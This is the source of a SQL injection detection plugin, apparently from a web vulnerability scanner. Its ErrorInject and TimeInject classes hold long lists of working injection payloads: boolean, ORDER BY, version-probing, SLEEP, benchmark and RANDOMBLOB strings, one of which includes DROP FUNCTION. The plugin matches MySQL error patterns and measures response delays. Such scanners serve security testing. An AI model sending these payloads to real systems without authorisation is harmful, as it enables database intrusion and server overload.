#! usr/bin/python 
#coding=utf-8 

import re
from copy import deepcopy

from moudle.lurkscan.pluginmanager import Check
from moudle.lurkscan.plugins.sqlinject.sqlinject import SqlInject
from moudle.lurkscan.plugins.sqlinject.sqlinject import InjectEntity

class ErrorInject(SqlInject, Check):
	
	def __init__(self):
		self.__errors = self.load_errors()
	
	def _load_payloads(self):
		return ['\'', '"', ' OR 1=1', ' OR 1=0', ' OR x=x', ' OR x=y', ' OR 1=1#', ' OR 1=0#', ' OR x=x#', ' OR x=y#', ' OR 1=1-- ', ' OR 1=0-- ', ' OR x=x-- ', ' OR x=y-- ', ' OR 3409=3409 AND (\'pytW\' LIKE \'pytW', ' OR 3409=3409 AND (\'pytW\' LIKE \'pytY', ' HAVING 1=1', ' HAVING 1=0', ' HAVING 1=1#', ' HAVING 1=0#', ' HAVING 1=1-- ', ' HAVING 1=0-- ', ' AND 1=1', ' AND 1=0', ' AND 1=1-- ', ' AND 1=0-- ', ' AND 1=1#', ' AND 1=0#', ' AND 1=1 AND \'%\'=\'', ' AND 1=0 AND \'%\'=\'', ' AND 1083=1083 AND (1427=1427', ' AND 7506=9091 AND (5913=5913', ' AND 1083=1083 AND (\'1427=1427', ' AND 7506=9091 AND (\'5913=5913', ' AND 7300=7300 AND \'pKlZ\'=\'pKlZ', ' AND 7300=7300 AND \'pKlZ\'=\'pKlY', ' AND 7300=7300 AND (\'pKlZ\'=\'pKlZ', ' AND 7300=7300 AND (\'pKlZ\'=\'pKlY', ' AS INJECTX WHERE 1=1 AND 1=1', ' AS INJECTX WHERE 1=1 AND 1=0', ' AS INJECTX WHERE 1=1 AND 1=1#', ' AS INJECTX WHERE 1=1 AND 1=0#', ' AS INJECTX WHERE 1=1 AND 1=1--', ' AS INJECTX WHERE 1=1 AND 1=0--', ' WHERE 1=1 AND 1=1', ' WHERE 1=1 AND 1=0', ' WHERE 1=1 AND 1=1#', ' WHERE 1=1 AND 1=0#', ' WHERE 1=1 AND 1=1--', ' WHERE 1=1 AND 1=0--', ' ORDER BY 1-- ', ' ORDER BY 2-- ', ' ORDER BY 3-- ', ' ORDER BY 4-- ', ' ORDER BY 5-- ', ' ORDER BY 6-- ', ' ORDER BY 7-- ', ' ORDER BY 8-- ', ' ORDER BY 9-- ', ' ORDER BY 10-- ', ' ORDER BY 11-- ', ' ORDER BY 12-- ', ' ORDER BY 13-- ', ' ORDER BY 14-- ', ' ORDER BY 15-- ', ' ORDER BY 16-- ', ' ORDER BY 17-- ', ' ORDER BY 18-- ', ' ORDER BY 19-- ', ' ORDER BY 20-- ', ' ORDER BY 21-- ', ' ORDER BY 22-- ', ' ORDER BY 23-- ', ' ORDER BY 24-- ', ' ORDER BY 25-- ', ' ORDER BY 26-- ', ' ORDER BY 27-- ', ' ORDER BY 28-- ', ' ORDER BY 29-- ', ' ORDER BY 30-- ', ' ORDER BY 31337-- ', ' ORDER BY 1# ', ' ORDER BY 2# ', ' ORDER BY 3# ', ' ORDER BY 4# ', ' ORDER BY 5# ', ' ORDER BY 6# ', ' ORDER BY 7# ', ' ORDER BY 8# ', ' ORDER BY 9# ', ' ORDER BY 10# ', ' ORDER BY 11# ', ' ORDER BY 12# ', ' ORDER BY 13# ', ' ORDER BY 14# ', ' ORDER BY 15# ', ' ORDER BY 16# ', ' ORDER BY 17# ', ' ORDER BY 18# ', ' ORDER BY 19# ', ' ORDER BY 20# ', ' ORDER BY 21# ', ' ORDER BY 22# ', ' ORDER BY 23# ', ' ORDER BY 24# ', ' ORDER BY 25# ', ' ORDER BY 26# ', ' ORDER BY 27# ', ' ORDER BY 28# ', ' ORDER BY 29# ', ' ORDER BY 30#', ' ORDER BY 31337#', ' ORDER BY 1 ', ' ORDER BY 2 ', ' ORDER BY 3 ', ' ORDER BY 4 ', ' ORDER BY 5 ', ' ORDER BY 6 ', ' ORDER BY 7 ', ' ORDER BY 8 ', ' ORDER BY 9 ', ' ORDER BY 10 ', ' ORDER BY 11 ', ' ORDER BY 12 ', ' ORDER BY 13 ', ' ORDER BY 14 ', ' ORDER BY 15 ', ' ORDER BY 16 ', ' ORDER BY 17 ', ' ORDER BY 18 ', ' ORDER BY 19 ', ' ORDER BY 20 ', ' ORDER BY 21 ', ' ORDER BY 22 ', ' ORDER BY 23 ', ' ORDER BY 24 ', ' ORDER BY 25 ', ' ORDER BY 26 ', ' ORDER BY 27 ', ' ORDER BY 28 ', ' ORDER BY 29 ', ' ORDER BY 30 ', ' ORDER BY 31337 ', ' RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND \'Txws\'=\'', ' RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND \'Txws\'=\'', 'IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--', 'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--', '%\' AND 8310=8310 AND \'%\'=\'', '%\' AND 8310=8311 AND \'%\'=\'', ' and (select substring(@@version,1,1))=\'X\'', ' and (select substring(@@version,1,1))=\'M\'', ' and (select substring(@@version,2,1))=\'i\'', ' and (select substring(@@version,2,1))=\'y\'', ' and (select substring(@@version,3,1))=\'c\'', ' and (select substring(@@version,3,1))=\'S\'', ' and (select substring(@@version,3,1))=\'X\'']
		
	def load_errors(self):
		return [r'SQL syntax.*?MySQL', 
				r'Warning.*?mysql_', 'MySqlException \(0x', 
				r'valid MySQL result', 
				r'check the manual that corresponds to your (MySQL|MariaDB) server version', 
				r'MySqlClient\.',
				r'MySqlClient\.',
				r'com\.mysql\.jdbc\.exceptions']
	
	def _check(self, inject):
		for error in self.__errors:
			if re.search(error, inject.content, re.I):
				return error
		
class TimeInject(SqlInject, Check):
	
	def __init__(self):
		#测试正常响应时间的次数
		self.__test_num = 3
		#响应时间平均数
		self.__mean = 0
		#TODO 写死为5秒，增加多个秒
		self.time = 4
	
	def _load_payloads(self):
		payloads_raw = ['', '', '', 'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND \'vRxe\'=\'vRxe', ' AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND \'%\'=\'', ' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)', ' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--', ' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#', 'SLEEP(5)#', 'SLEEP(5)-- ', 'SLEEP(5)="', 'SLEEP(5)=\'', ' or SLEEP(5)', ' or SLEEP(5)#', ' or SLEEP(5)--', ' or SLEEP(5)="', ' or SLEEP(5)=\'', 'waitfor delay \'00:00:05\'', 'waitfor delay \'00:00:05\'-- ', 'waitfor delay \'00:00:05\'#', 'benchmark(50000000,MD5(1))', 'benchmark(50000000,MD5(1))-- ', 'benchmark(50000000,MD5(1))#', ' or benchmark(50000000,MD5(1))', ' or benchmark(50000000,MD5(1))-- ', ' or benchmark(50000000,MD5(1))#', 'pg_SLEEP(5)', 'pg_SLEEP(5)-- ', 'pg_SLEEP(5)#', ' or pg_SLEEP(5)', ' or pg_SLEEP(5)-- ', ' or pg_SLEEP(5)#', '\'\"', ' AnD SLEEP(5)', ' AnD SLEEP(5)--', ' AnD SLEEP(5)#', '&&SLEEP(5)', '&&SLEEP(5)--', '&&SLEEP(5)#', '\' AnD SLEEP(5) ANd \'1', '\'&&SLEEP(5)&&\'1', ' ORDER BY SLEEP(5)', ' ORDER BY SLEEP(5)-- ', ' ORDER BY SLEEP(5)#', '(SELECT * FROM (SELECT(SLEEP(5)))ecMj)', '(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#', '(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--', '+benchmark(3200,SHA1(1))+\'', ' + SLEEP(10) + \'', ' RANDOMBLOB(500000000/2)', ' AND 2947=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(500000000/2))))', ' OR 2947=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(500000000/2))))', ' RANDOMBLOB(1000000000/2)', ' AND 2947=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(1000000000/2))))', ' OR 2947=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(1000000000/2))))', 'SLEEP(2)/*\' or SLEEP(2) or \'" or SLEEP(1) or "*/']
		#['', '', '', '%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))bAKL)%20AND%20%27vRxe%27%3d%27vRxe', '%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))YjoC)%20AND%20%27%%27%3d%27', '%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP)', '%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP)--', '%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP)#', 'SLEEP(5)#', 'SLEEP(5)--%20', 'SLEEP(5)%3d%22', 'SLEEP(5)%3d%27', '%20or%20SLEEP(5)', '%20or%20SLEEP(5)#', '%20or%20SLEEP(5)--', '%20or%20SLEEP(5)%3d%22', '%20or%20SLEEP(5)%3d%27', 'waitfor%20delay%20%2700:00:05%27', 'waitfor%20delay%20%2700:00:05%27--%20', 'waitfor%20delay%20%2700:00:05%27#', 'benchmark(50000000,MD5(1))', 'benchmark(50000000,MD5(1))--%20', 'benchmark(50000000,MD5(1))#', '%20or%20benchmark(50000000,MD5(1))', '%20or%20benchmark(50000000,MD5(1))--%20', '%20or%20benchmark(50000000,MD5(1))#', 'pg_SLEEP(5)', 'pg_SLEEP(5)--%20', 'pg_SLEEP(5)#', '%20or%20pg_SLEEP(5)', '%20or%20pg_SLEEP(5)--%20', '%20or%20pg_SLEEP(5)#', '%27\%22', '%20AnD%20SLEEP(5)', '%20AnD%20SLEEP(5)--', '%20AnD%20SLEEP(5)#', '&&SLEEP(5)', '&&SLEEP(5)--', '&&SLEEP(5)#', '%27%20AnD%20SLEEP(5)%20ANd%20%271', '%27&&SLEEP(5)&&%271', '%20ORDER%20BY%20SLEEP(5)', '%20ORDER%20BY%20SLEEP(5)--%20', '%20ORDER%20BY%20SLEEP(5)#', '(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))ecMj)', '(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))ecMj)#', '(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))ecMj)--', '+benchmark(3200,SHA1(1))+%27', '%20+%20SLEEP(10)%20+%20%27', '%20RANDOMBLOB(500000000/2)', '%20AND%202947%3dLIKE(%27ABCDEFG%27,UPPER(HEX(RANDOMBLOB(500000000/2))))', '%20OR%202947%3dLIKE(%27ABCDEFG%27,UPPER(HEX(RANDOMBLOB(500000000/2))))', '%20RANDOMBLOB(1000000000/2)', '%20AND%202947%3dLIKE(%27ABCDEFG%27,UPPER(HEX(RANDOMBLOB(1000000000/2))))', '%20OR%202947%3dLIKE(%27ABCDEFG%27,UPPER(HEX(RANDOMBLOB(1000000000/2))))', 'SLEEP(2)/*%27%20or%20SLEEP(2)%20or%20%27%22%20or%20SLEEP(1)%20or%20%22*/']
		#['%27%20AND%20SLEEP(5)%20AND%20%27TgYR%27%3d%27TgYR']
		payloads = []
		"""for i in range(0, self.__test_num):
			payloads.append('')
		for i in range(2, len(payloads)):
			#for t in self.time:
			#	for y in range(0, len(payloads_raw)):
				payloads.append(payloads_raw[y].replace('{time}',str(t)))"""
		return payloads_raw
	
	def get_timeout(self):
		return 7
	
	def _check(self, inject):
		diff = inject.time_diff()
		#计算平均值
		if self.__test_num > 0:
			if not self.__mean:
				self.__mean = diff
			self.__mean = (self.__mean + diff)/2
		else:
			#时间差大于最小的sleep时间则是时间盲注
			self.__test_num = 3
			#TODO 判断不准确，下版本升级
			return (diff - self.__mean) >= self.time
		self.__test_num -= 1
		
class UnionInject(SqlInject):
	pass